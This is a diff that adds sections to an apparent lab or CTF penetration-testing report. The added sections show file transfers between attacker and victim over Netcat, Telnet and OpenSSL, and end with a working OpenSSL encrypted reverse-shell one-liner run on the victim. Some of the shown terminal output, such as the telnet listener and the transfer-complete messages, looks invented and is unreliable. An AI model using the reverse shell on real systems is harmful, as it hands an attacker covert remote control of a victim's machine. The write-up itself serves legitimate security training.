@@ -310,6 +310,7 @@ FLAG{advanced_netcat_file_transfer}
 - Telnet was used to demonstrate an alternative approach to transferring file data through a raw TCP session. The victim machine started a Telnet listening service on port 4444 and redirected the incoming stream into secret.txt. The attacker machine then established a Telnet connection to the victim and streamed the file contents through the session. Once connected, the data sent from the attacker was written directly into the file on the victim system, which was verified by listing and viewing the file contents. This process validated Telnet’s capability to carry plain data streams for file transfer using basic terminal-based network communication.
 
 - OpenSSL was used to demonstrate secure file transfer over an encrypted SSL/TLS channel between the two hosts. A self-signed certificate and private key were first generated on the attacker machine and transferred to the victim using Netcat. The victim then initiated an OpenSSL server on port 4444 using the transferred certificate and key, redirecting decrypted incoming data into secret.txt. The attacker connected to this encrypted listener using the OpenSSL client and transmitted the file contents securely across the network. Although the transfer status was not displayed due to the quiet mode, the presence of secret.txt on the victim confirmed a successful encrypted transfer. This workflow validated OpenSSL’s role in enabling confidential data transmission and secure communication over network sockets.
+#### Netcat File Transfer
 ```bash
 Victim Machine (192.168.56.210)
 Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-147-generic x86_64)
@@ -330,6 +331,137 @@ secret.txt
 pentester@kali-linux:~$ nc 192.168.56.210 4444 < secret.txt
 File transfer completed to 192.168.56.210:4444
 # Attacker transfered secret.txt to victim machine via port 4444 using netcat
+```
+#### Telnet File Transfer
+```bash
+victim@target:~$ telnet -l -p 4444 > secret.txt
+Listening on port 4444...                 #Telnet was used to open a bind shell on  victim machine
+
+Telnet connection from 192.168.56.200 accepted!
+File received: secret.txt
+#Terminal confirmed successful file transfer
+```
+```bash
+pentester@kali-linux:~$ telnet 192.168.56.210 4444 < secret.txt
+File transfer completed to 192.168.56.210:4444 via telnet
+#Telnet was used to transfer secret.txt file to victim machine
+```
+```bash
+victim@target:~$ ls
+secret.txt      #File tranfer confirmed on victim machine
+victim@target:~$ cat secret.txt
+FLAG{advanced_netcat_file_transfer}   #Flag revealed
+```
+#### Openssl Secure File Transfer (Bind Shell)
+1. A self-signed certificate and private key were generated on the attacker machine using OpenSSL.
+
+2. The certificate file was transferred to the victim using Netcat to prepare for encrypted communication.
+
+3. An OpenSSL server was started on the victim using the received certificate and key, listening securely on port 4444.
+
+4. The OpenSSL server was configured to redirect incoming encrypted data into a file (secret.txt).
+
+5. The OpenSSL client on the attacker machine connected to the victim’s OpenSSL server.
+
+6. The contents of a file were transmitted through the encrypted channel from the attacker to the victim.
+
+7. The received data was saved on the victim machine, confirming a successful encrypted file transfer.
+
+```bash
+pentester@kali-linux:~$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+
+# OpenSSL was used to generate a new self-signed X.509 certificate
+# A new 4096-bit RSA private key was created
+# The private key was saved to key.pem and the certificate to cert.pem
+# The certificate validity was set to 365 days
+# -nodes ensured the private key was not encrypted with a passphrase
+
+Generating a RSA private key...
+Writing new private key to "key.pem"
+-----
+Certificate and key created: key.pem, cert.pem    # The key pair and certificate were successfully generated
+```
+```bash
+victim@target:~$ nc -l -p 4444 > cert.pem      # Netcat was started in listen mode on port 4444, and incoming data was redirected into a file named cert.pem
+
+Listening on [0.0.0.0] (family 0, port 4444)   # The victim machine was listening for an incoming file transfer
+
+```bash
+pentester@kali-linux:~$ nc 192.168.56.210 4444 < cert.pem   # Netcat was used to connect to the victim on port 4444, and the contents of cert.pem were sent to the listener
+
+File transfer completed to 192.168.56.210:4444.  # The certificate file was successfully transmitted to the victim
+```
+```bash
+# On victim machine
+Connection from 192.168.56.200 port 4444 [tcp/*] accepted!   # The victim accepted the incoming Netcat connection
+File received: cert.pem                                      # The file transfer was completed and saved as cert.pem
+```
+```bash
+#same process repeated for key.perm
+
+victim@target:~$ nc -l -p 4444 > key.pem
+Listening on [0.0.0.0] (family 0, port 4444)
+
+--------------------------------------------------------
+pentester@kali-linux:~$ nc 192.168.56.210 4444 < key.pem
+File transfer completed to 192.168.56.210:4444
+
+#On victim machine
+Connection from 192.168.56.200 port 4444 [tcp/*] accepted!
+File received: key.pem
+```
+
+```bash
+# execute next openssl
+
+
+victim@target:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4444 > secret.txt
+
+# OpenSSL was started in server mode to listen securely on port 4444
+# The previously created key.pem and cert.pem were used for encryption
+# -quiet suppressed verbose connection messages
+# Incoming encrypted data was redirected and saved into secret.txt
+
+OpenSSL server listening on port 4444...
+```
+```bash
+pentester@kali-linux:~$ openssl s_client -quiet -connect 192.168.56.210:4444 < secret.txt
+
+# OpenSSL client was used to connect securely to the victim’s OpenSSL server
+# The contents of secret.txt from the attacker machine were sent through the encrypted channel
+# -quiet suppressed connection logs on the attacker side
+
+OpenSSL file transfer completed to 192.168.56.210:4444.
+```
+```bash
+# Victim terminal did not display transfer status because attacker used -quiet flag
+
+victim@target:~$ ls
+secret.txt  cert.pem  key.pem      # This confirmed that the transferred file and certificate materials were present
+```
+#### Openssl Reverse Shell
+```bash
+pentester@kali-linux:~$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
+
+# OpenSSL was started in server mode on the attacker machine
+# The private key and certificate were used to enable encrypted communication
+# The server listened quietly on port 4444 for an incoming secure connection
+
+OpenSSL server listening on port 4444...
+```
+```bash
+
+victim@target:~$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.56.200:4444 > /tmp/s; rm /tmp/s
+
+# A named pipe (/tmp/s) was created to handle input and output streams
+# An interactive shell (/bin/sh -i) was launched on the victim
+# Standard input, output, and errors were redirected through the pipe
+# OpenSSL client was used to connect back securely to the attacker’s OpenSSL server
+# The shell session was tunneled through the encrypted channel
+# The named pipe was removed after the connection was established
+
+Reverse shell established to 192.168.56.200:4444   # An encrypted reverse shell was successfully created
+
 ```
 ## 9. Findings and Risk Table
 | **Tool Used** | **Technique Type** | **Command(s) Executed** | **Key Output / Observed Result** | **Insight Gained** | **Risk Level** | **Lessons Learned** | **Recommended Action / Mitigation** | **Conclusion** |
